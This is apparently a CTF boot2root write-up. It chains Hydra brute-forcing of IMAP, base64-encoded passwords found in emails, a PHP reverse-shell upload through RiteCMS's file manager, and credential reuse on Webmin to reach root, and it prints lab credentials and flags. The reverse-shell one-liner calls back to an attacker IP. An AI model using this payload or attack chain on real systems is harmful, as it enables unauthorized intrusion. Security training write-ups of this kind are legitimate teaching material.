---
title: "OWASP Liga CTF 2026 - ChainsOfAttacks (Boot2Root)"
date: 2026-05-30
categories: [CTF, Writeups, B2R]
tags: [OWASPKL]
description: A challenge featuring IMAP enumeration, credential discovery through email, RiteCMS file upload exploitation, reverse shell access, and Webmin-based privilege escalation to root/
image: /assets/img/OWASPKcover.png
---

## Network Reconnaissance

```bash
nmap -sCV 192.168.100.119 --vv
```

Results:

![/assets/img/imgLIGA1.png](/assets/img/imgLIGA1.png)

Nmap scan revealed three open ports:

- `143/tcp` — IMAP (Dovecot)
- `8080/tcp` — HTTP (Apache — RiteCMS)
- `9090/tcp` — HTTPS (Webmin / MiniServ)

## IMAP Enumeration

With usernames from context (`kdjebat`, `profapokalips`), Hydra was used to brute-force IMAP credentials:

![/assets/img/imgLIGA1(1).png](/assets/img/imgLIGA1(1).png)

**Result:** 

Both accounts used the password `admin`.

```bash
Cred 1: kdjebat:admin
Cred 2: profapokalips:admin
```

### Reading the Mailboxes

Connected to IMAP on port 143 using raw IMAP commands via netcat:

```bash
nc 192.168.100.119 143
```

Mailbox: kdjebat

```
* OK [CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ AUTH=PLAIN] Dovecot ready.
a1 LOGIN kdjebat admin
a1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE REPLACE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW SPECIAL-USE STATUS=SIZE SAVEDATE COMPRESS=DEFLATE INPROGRESS NOTIFY LITERAL+] Logged in
a2 LIST "" "*"
* LIST (\HasNoChildren) "/" INBOX
a2 OK List completed (0.037 + 0.000 + 0.037 secs).
a3 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 6 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1780031812] UIDs valid
* OK [UIDNEXT 7] Predicted next UID
a3 OK [READ-WRITE] Select completed (0.043 + 0.000 + 0.042 secs).
a4 SEARCH ALL
* SEARCH 1 2 3 4 5 6
a4 OK Search completed (0.009 + 0.000 + 0.008 secs).
a5 FETCH 1 BODY[]
* 1 FETCH (BODY[] {293}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 10:02:55 +0800

Eh belum pernah guna lagi la.

Tapi aku pernah tengok documentation dia.
Nampak okay je. Ringan kan?

Bila ko plan nak deploy? Server mana?

- Prof
)
a5 OK Fetch completed (0.007 + 0.000 + 0.006 secs).
a6 FETCH 1:6 BODY[]
* 1 FETCH (BODY[] {293}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 10:02:55 +0800

Eh belum pernah guna lagi la.

Tapi aku pernah tengok documentation dia.
Nampak okay je. Ringan kan?

Bila ko plan nak deploy? Server mana?

- Prof
)
* 2 FETCH (BODY[] {260}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 11:30:44 +0800

Ok boleh. Aku free dari Rabu ni.

Eh tapi CMS tu ada admin panel kan?
Default creds dia apa? Admin admin ke?

- Prof
)
* 3 FETCH (BODY[] {244}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 15:45:19 +0800

Dapat. Nampak landing page dia.

Tapi aku tak boleh masuk admin panel lagi.
Belum ada creds kan?

- Prof
)
* 4 FETCH (BODY[] {285}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:21:44 +0800

Haha okay okay aku faham hint tu.

Dah masuk dah. Nampak dashboard.

Eh banyak jugak feature dia. File manager
ada sekali eh. Best gak.

- Prof
)
* 5 FETCH (BODY[] {311}
From: profapokalips@appsecmy.com
To: kdjebat@appsecmy.com
Subject: RE: Update deployment
Date: Tue, 20 May 2026 09:15:33 +0800

Relax bro aku tau la.

Aku dah test create page, upload gambar,
semua okay je.

Performance pun laju. Good choice la CMS ni.

Ada lagi ke benda nak kena setup?

- Prof
)
* 6 FETCH (BODY[] {256}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subjet: RE: Update deployment
Date: Fri, 22 May 2026 20:00:00 +0800

Salam bro,
aku tukar password. Password lama tak betul. New password (sila decrypt):

YWN0dWFsbHlpZGsxMjNA==

- kdjebat)
a6 OK Fetch completed (0.013 + 0.000 + 0.012 secs).

```

Try to find more information on the other user:

```bash
nc 192.168.100.119 143
```

Login as profapokalips

```
* OK [CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ AUTH=PLAIN] Dovecot ready.
a1 LOGIN profapokalips admin
a1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE REPLACE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW SPECIAL-USE STATUS=SIZE SAVEDATE COMPRESS=DEFLATE INPROGRESS NOTIFY LITERAL+] Logged in
a2 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 8 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1779718565] UIDs valid
* OK [UIDNEXT 9] Predicted next UID
a2 OK [READ-WRITE] Select completed (0.036 + 0.000 + 0.035 secs).
a3 SEARCH ALL
* SEARCH 1 2 3 4 5 6 7 8
a3 OK Search completed (0.001 + 0.000 secs).
a4 FETCH 1:8 BODY[]            
* 1 FETCH (BODY[] {328}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Pasal deployment baru
Date: Mon, 19 May 2026 09:14:22 +0800

Yo bro,

Aku nak start setup CMS baru untuk project ni.
Nama dia RiteCMS. Korang dah pernah guna tak?

Aku tengah test kat local dulu. Nanti kalau okay
aku deploy kat server.

- Kdjebat
)
* 2 FETCH (BODY[] {326}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 10:45:11 +0800

Ha ah ringan gila. PHP je. Tak payah banyak
dependencies.

Plan nak deploy minggu ni jugak. Kat server
chain tu. Port 8080.

Ko nanti kena tolong test dari luar sekali.

- Kdjebat
)
* 3 FETCH (BODY[] {296}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Pasal deployment baru
Date: Mon, 19 May 2026 11:58:02 +0800

Ha ah default memang admin admin.

Tapi jangan risau aku dah tukar. Nanti
aku bagi password baru.

Deployment petang ni kot. Aku update ko.

- Kdjebat
)
* 4 FETCH (BODY[] {260}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Update deployment
Date: Mon, 19 May 2026 15:22:37 +0800

Bro,

Done dah deploy. Running smooth.

http://chain:8080/ritecms

Cuba ko hit dari browser. Tengok dapat tak.

- Kdjebat
)
* 5 FETCH (BODY[] {348}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:03:58 +0800

Ha betul. Ni ha.

username: admin

password aku dah setup. japgi aku send.
YWN0dWFsbHkxMjNA==

tapi pandai ah kau decode. pakai cyberchef je.

kalau takleh masuk, bgtau. aku create user baru.

- Kdjebat
)
* 6 FETCH (BODY[] {319}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Mon, 19 May 2026 16:40:05 +0800

Ha tu la. Senang sikit manage content.

Tapi jangan main-main upload benda pelik
kat file manager tu. Server production ni.

Ko test functionality yang basic je dulu.

- Kdjebat
)
* 7 FETCH (BODY[] {339}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: RE: Update deployment
Date: Tue, 20 May 2026 10:02:17 +0800

Okay good.

Lepas ni aku plan nak integrate dengan
database. Ada sikit lagi kena configure.

For now deployment dah stable. Aku inform
team lain sekali.

Thanks sebab tolong test bro.

- Kdjebat
)
* 8 FETCH (BODY[] {259}
From: kdjebat@appsecmy.com
To: profapokalips@appsecmy.com
Subject: Pasal username
Date: Tue, 20 May 2026 14:33:09 +0800

Oh lupa nak bagitau.

Aku dah tukar username admin tu.
Pakai nama aku sekarang.

Password sama je. Tak tukar pun.

- Kdjebat
)
a4 OK Fetch completed (0.010 + 0.000 + 0.009 secs).
* BYE Disconnected for inactivity.

```

Reading all emails in this inbox told the full story:

1. `kdjebat` deployed **RiteCMS** at `http://chain:8080/ritecms`
2. The default credentials were `admin:admin` but were changed

Add DNS to the `/etc/hosts`:

```bash
192.168.100.119 chain
```

In the mailbox `profapokalips`, there is email said:

```
username: admin

password aku dah setup.
YWN0dWFsbHkxMjNA==
```

Decode Base64:

```bash
echo"YWN0dWFsbHkxMjNA==" | base64-d
```

Output:

```
actually123@
```

There is another email:

```
Aku dah tukar username admin tu.
Pakai nama aku sekarang.

Password sama je.
```

Reading all messages revealed an email where `kdjebat` sent a new (encrypted) password to `profapokalips`:

```bash
YWN0dWFsbHlpZGsxMjNA==
```

Decoding Base64:

```bash
echo "YWN0dWFsbHlpZGsxMjNA==" | base64 -d
# Output: actuallyidk123@
```

So, CMS credentials is:

```
Username: kdjebat
Password: actuallyidk123@
```

## Directory Enumeration on RiteCMS

With the URL confirmed (`http://chain:8080/ritecms`), Gobuster was used to enumerate directories and PHP files:

![/assets/img/imgLIGA1(2).png](/assets/img/imgLIGA1(2).png)

The `admin.php` page was the admin panel entry point.

## RCE via File Upload

After logging in to `http://chain:8080/ritecms/admin.php` with `kdjebat:actuallyidk123@`, the admin panel included a **File Manager** feature.

The file manager allowed uploading files directly to the `files/` directory including **PHP files**, which the server would execute.

Create `rev.php`  payload:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/192.168.100.143/4444 0>&1'");
?>
```

Upload shell:

![/assets/img/imgLIGA1(3).png](/assets/img/imgLIGA1(3).png)

The file (`rev.php`) was uploaded through the File Manager UI. A netcat listener was set up on the attacker machine:

![/assets/img/imgLIGA1(4).png](/assets/img/imgLIGA1(4).png)

A reverse shell connected back running as `www-data`.

After getting shell access, the home directory was explored:

![/assets/img/imgLIGA1(5).png](/assets/img/imgLIGA1(5).png)

## 🚩 Local Flag

`OWASPKL{47f1adc2c50c9a61292b05eb444c07eb}`

## Credential Discovery in Web Files

Further enumeration of the web application directory revealed a database configuration file:

![/assets/img/imgLIGA1(6).png](/assets/img/imgLIGA1(6).png)

These credentials turned out to be reused for the **Webmin** panel running on port 9090.

```
username: aimantino
password: 4iman_4dmin@2024
```

## Privilege Escalation via Webmin

Login to the webmin using those credential

![/assets/img/imgLIGA1(7).png](/assets/img/imgLIGA1(7).png)

The session was authenticated successfully as this user.

Inside Webmin, navigated to:

```
**Tools → Command Shell**
```

![/assets/img/imgLIGA1(8).png](/assets/img/imgLIGA1(8).png)

This feature allows direct shell command execution on the server. Running `ls -lah` confirmed we were operating in the `/root` directory:

```bash
-rw-r--r-- 1 root root 42 May 25 21:17 proof.txt
```

The root flag was retrieved with:

```bash
cat proof.txt
```

![/assets/img/imgLIGA1(9).png](/assets/img/imgLIGA1(9).png)

## 🚩 Root Flag

`OWASPKL{68e8511198425c0cbbb3f0d182314afd}`